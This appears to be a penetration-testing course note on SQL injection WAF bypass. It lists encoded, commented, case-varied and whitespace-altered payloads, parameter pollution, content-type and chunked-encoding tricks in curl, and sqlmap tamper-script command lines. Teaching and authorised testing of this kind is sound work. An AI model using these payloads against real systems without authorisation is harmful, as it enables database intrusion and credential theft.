---
tags: [vapt, sqli, advanced]
difficulty: advanced
module: "06 - SQL Injection"
topic: "06.14 SQLi WAF Bypass Techniques"
---

# 06.14 — SQLi WAF Bypass Techniques

## Why WAF Bypass Matters

WAFs (Web Application Firewalls) pattern-match requests looking for SQLi signatures like `UNION SELECT`, `OR 1=1`, `SLEEP(`, etc. Bypassing WAFs requires encoding, obfuscating, or restructuring payloads so they reach the database intact but evade signature detection.

```
WAF INTERCEPTS:
  ?id=1' UNION SELECT username,password FROM users--
  → BLOCKED: pattern matches "UNION SELECT"

BYPASS:
  ?id=1' /*!UNION*/ /*!SELECT*/ username,password FROM users--
  → PASSES WAF: pattern doesn't match inline comments
  → DATABASE: executes correctly (MySQL ignores /*!...*/ conditionals)
```

---

## Encoding Bypasses

### URL Encoding

```
' → %27
  → %20
# → %23
( → %28
) → %29

EXAMPLES:
  Normal:  ?id=1' OR 1=1--
  Encoded: ?id=1%27%20OR%201%3D1--

DOUBLE ENCODING (if WAF decodes once):
  ' → %27 → %2527
  So ' → URL-encoded → %27 → URL-encoded again → %2527
  
  ?id=1%2527 OR 1=1--
  WAF sees: 1%2527 (doesn't look like quote)
  App decodes: 1%27 → then DB sees 1' → injection!
```

### HTML Entity Encoding

```
' → &#39; or &apos;
" → &quot;
< → &lt;
> → &gt;

USEFUL IN XML/HTML CONTEXTS:
  username=&#39; OR 1=1--
  → HTML decoded by app → ' OR 1=1-- → SQLi!
```

### Unicode Encoding

```python
# UNICODE ALTERNATIVES TO SINGLE QUOTE:
# ʼ (U+02BC, Modifier Letter Apostrophe)
# ʻ (U+02BB, Modifier Letter Turned Comma)  
# ' (U+2018, Left Single Quotation Mark)
# ' (U+2019, Right Single Quotation Mark)
# ‛ (U+201B, Single High-Reversed-9 Quotation Mark)

# MySQL may treat some Unicode quotes as string delimiters!
# Test: send username with Unicode quote instead of ASCII quote
```

---

## Comment-Based Bypasses

### Inline Comments

```sql
-- MYSQL INLINE COMMENTS (/* */ inside keywords):
UNION SELECT → UN/**/ION SEL/**/ECT
UNION SELECT → /*!UNION*/ /*!SELECT*/
UNION SELECT → UNION/*comment*/SELECT
OR          → O/**/R
AND         → AN/**/D
WHERE       → WH/**/ERE

-- MYSQL CONDITIONAL COMMENTS (version-specific):
/*!UNION SELECT*/    → executes in MySQL (any version)
/*!50000UNION SELECT*/ → executes only if MySQL >= 5.00.00

-- EXAMPLES:
?id=1' /*!UNION*/ /*!SELECT*/ NULL,NULL--
?id=1' UNION/*x*/SELECT/*x*/NULL,NULL--
?id=1' UN/**/ION SEL/**/ECT NULL,NULL--
```

### Nested Comments

```sql
-- SOME WAFSESCAPE ONE LEVEL BUT NOT NESTED:
?id=1'/*! UNION SELECT*/NULL,NULL--
?id=1' UN/*!ION*/SELECT NULL,NULL--

-- STRIP COMMENT → STILL INJECTION:
?id=1'  UNION--comment%0ASELECT NULL,NULL--
-- WAF removes --comment → gets: UNION\nSELECT (newline allowed!)
```

---

## Case Variation

```sql
-- WAF PATTERNS ARE OFTEN CASE-SENSITIVE:
UNION SELECT → uNiOn sElEcT
UNION SELECT → UNION Select
OR           → Or
AND          → aND
SLEEP        → Sleep
WHERE        → wHErE

-- MIXED CASE EXAMPLES:
?id=1' UniOn SeLeCt NULL,NULL--
?id=1' OR 1=1--
?id=1' oR 1=1--
?id=1' Or 1=1--
```

---

## Whitespace Alternatives

```sql
-- ALTERNATIVES TO SPACE (WAFs often block space in SQL):
-- Tab: %09
-- Newline: %0a
-- Carriage Return: %0d
-- Form feed: %0c
-- Vertical tab: %0b
-- Comment as space: /**/

EXAMPLES:
?id=1'%09UNION%09SELECT%09NULL,NULL--
?id=1'%0aUNION%0aSELECT%0aNULL,NULL--
?id=1'/**/UNION/**/SELECT/**/NULL,NULL--

-- MYSQL: Line comment + newline (for keywords):
?id=1' UNION--+%0aSELECT NULL,NULL--
-- The "--+" is a valid comment, %0a (newline) ends it, SELECT continues!
```

---

## Keyword Bypasses

```sql
-- IF "UNION SELECT" IS BLOCKED:
-- Error-based doesn't need UNION:
?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--

-- Time-based doesn't need UNION:
?id=1' AND SLEEP(5)--

-- SUBQUERY INSTEAD OF UNION:
?id=1' AND (SELECT 1 FROM users WHERE username='admin' AND SLEEP(5))--

-- IF "OR" IS BLOCKED:
-- Use || (double pipe):
?id=1' || '1'='1
?id=1' || SLEEP(5)--

-- IF "AND" IS BLOCKED:
-- Use && (double ampersand):
?id=1' && SLEEP(5)--

-- IF "SELECT" IS BLOCKED:
-- UPPERCASE + COMMENT:
?id=1' UNION S/**/ELECT NULL,NULL--
-- Or try: SelEcT, sElEcT, select

-- IF "WHERE" IS BLOCKED:
-- Use HAVING:
?id=1' UNION SELECT username FROM users HAVING 1=1--
-- Use subquery:
?id=1' UNION SELECT * FROM (SELECT username FROM users)a--
```

---

## Boolean Operator Alternatives

```sql
-- INSTEAD OF: ' OR 1=1--
' || 1=1--          -- MySQL/PostgreSQL (|| = OR)
' | 1=1--           -- bitwise OR (sometimes works)

-- INSTEAD OF: ' AND 1=1--
' && 1=1--          -- MySQL (double ampersand = AND)
' & 1=1--           -- bitwise AND

-- COMPARISON ALTERNATIVES:
-- INSTEAD OF: =
!= not equal (reverse logic)
LIKE 'pattern'
REGEXP '^a'
IN ('value')
BETWEEN 0 AND 1

-- INSTEAD OF: 1=1 (always true):
1 LIKE 1
1 IN (1)
1 BETWEEN 0 AND 2
1<2
0<1
CHAR(65)=CHAR(65)
```

---

## HTTP-Level Bypasses

### Parameter Pollution

```bash
# SEND SAME PARAMETER TWICE:
?id=1&id=1' OR 1=1--
# Some WAFs only check first occurrence, app uses last!

?id=1' OR 1=1--&id=1
# WAF checks second (safe), app uses first (injection)!

# JSON PARAMETER POLLUTION:
# {"id":"1","id":"1 OR 1=1--"}
# WAF checks first key, JSON parser uses last key!
```

### Content-Type Tricks

```bash
# SEND JSON TO FORM ENDPOINT (parser confusion):
curl -X POST https://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'"'"'--","password":"x"}'
# App expects form data but gets JSON → may bypass WAF rules for forms

# SEND FORM DATA TO JSON ENDPOINT:
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'username=admin'"'"'--&password=x'

# CHUNKED TRANSFER ENCODING:
# Split payload across chunks → WAF can't reassemble properly
curl -X POST https://target.com/login \
  -H "Transfer-Encoding: chunked" \
  --data-binary $'7\r\nuserna\r\n3\r\nme=\r\n6\r\nadmin\'\r\n0\r\n\r\n'
```

---

## SQLMap Tamper Scripts

SQLMap has built-in tamper scripts for WAF bypass:

```bash
# COMMON TAMPERS:
sqlmap -u "https://target.com/product?id=1" \
  --tamper=space2comment     # spaces → /**/
  
sqlmap -u "https://target.com/product?id=1" \
  --tamper=between           # > → BETWEEN
  
sqlmap -u "https://target.com/product?id=1" \
  --tamper=randomcase        # random case variation

# COMBINE MULTIPLE:
sqlmap -u "https://target.com/product?id=1" \
  --tamper=space2comment,between,randomcase,charunicodeescape

# FULL BYPASS KIT:
sqlmap -u "https://target.com/product?id=1" \
  --tamper="apostrophemask,apostropheglue,space2plus,space2comment,randomcase,between,charunicodeescape,multiplespaces,nonrecursivereplacement" \
  --random-agent \
  --delay=1 \
  --level=3 --risk=2

# LIST ALL TAMPERS:
sqlmap --list-tampers

# USEFUL TAMPERS:
# apostrophemask  → ' → %EF%BC%87 (Unicode fullwidth apostrophe)
# base64encode    → base64 encode the payload
# between         → > → NOT BETWEEN 0 AND
# charunicodeencode → encode with Unicode
# equaltolike     → = → LIKE
# lowercase       → all lowercase
# modsecurityversioned → inline versioned comment
# multiplespaces  → multiple spaces between words
# nonrecursivereplacement → insert keywords inside keywords
# randomcase      → random case
# space2comment   → spaces → /**/
# space2mssqlhash → spaces → %23 (hash in MSSQL)
# space2plus      → spaces → +
# unmagicquotes   → slash quotes bypass
# versionedkeywords → wrap keywords in MySQL version comments
```

---

## Testing WAF Rules Systematically

```bash
# STEP 1: IDENTIFY WAF:
wafw00f https://target.com

# STEP 2: PROBE WHAT'S BLOCKED:
# Send each component and see what gets blocked:
curl "https://target.com/?test=UNION"          → blocked?
curl "https://target.com/?test=SELECT"         → blocked?
curl "https://target.com/?test=UNION SELECT"   → blocked?
curl "https://target.com/?test=1'"             → blocked?
curl "https://target.com/?test=SLEEP(5)"       → blocked?

# STEP 3: TEST BYPASS FOR EACH BLOCKED COMPONENT:
curl "https://target.com/?test=UNI/**/ON"      → works?
curl "https://target.com/?test=SLEEP%0a(5)"    → works?

# STEP 4: COMBINE BYPASSES FOR FULL PAYLOAD:
curl "https://target.com/?id=1'%20UNI/**/ON%20SEL/**/ECT%20NULL,NULL--"

# STEP 5: AUTOMATED - sqlmap with WAF detection:
sqlmap -u "https://target.com/?id=1" --identify-waf

# STEP 6: REPORT WAF BYPASS:
# Document: WAF vendor, bypass technique used, working payload
```

---

## Related Notes
- [[25 - WAF Detection]] — identifying the WAF product
- [[21 - sqlmap Full Usage Guide]] — sqlmap tamper scripts
- [[Module 06 - All SQLi types]] — parent module context
- [[14 - SQLi WAF Bypass]] — self reference
